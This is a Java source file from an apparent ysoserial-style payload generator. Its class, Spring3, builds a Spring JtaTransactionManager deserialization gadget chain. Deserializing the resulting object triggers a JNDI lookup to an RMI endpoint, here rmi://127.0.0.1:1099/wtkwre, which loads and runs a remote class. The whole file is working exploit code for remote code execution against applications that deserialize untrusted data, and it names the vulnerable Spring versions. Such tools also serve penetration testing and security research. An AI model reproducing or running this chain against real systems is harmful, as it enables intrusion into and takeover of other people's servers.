package com.ppp.chain.spring;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.chain.others.Atomikos;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import org.springframework.transaction.jta.JtaTransactionManager;

@Dependencies({
        "org.springframework:spring-tx:4.1.4.RELEASE",
        "org.springframework:spring-context:4.1.4.RELEASE",
        "javax.transaction:jta:1.1"
})
@Authors({Authors.ZEROTHOUGHTS, Authors.SCICCONE})
@Sink({Sink.JNDI})
public class Spring3 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(Atomikos.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setCommand("rmi://127.0.0.1:1099/wtkwre");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);

        PayloadRunner.run(Spring3.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain((String) sinkObject);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        JtaTransactionManager jta = new JtaTransactionManager();
        jta.setUserTransactionName(command);
        return jta;
    }
}
